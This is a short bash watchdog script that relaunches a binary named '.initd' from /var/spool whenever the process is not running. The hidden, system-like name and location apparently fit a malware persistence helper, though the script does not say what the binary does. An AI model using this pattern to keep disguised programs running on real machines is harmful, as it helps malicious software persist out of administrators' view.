#!/bin/bash

# Define the process name
process_name1=".initd"

# Check if the process is running
if pgrep -x "$process_name1" > /dev/null
then
    echo "Process $process_name1 is running."
else
    echo "Process $process_name1 is not running. Starting it..."
    # Start the process
    /var/spool/"$process_name1" &
fi



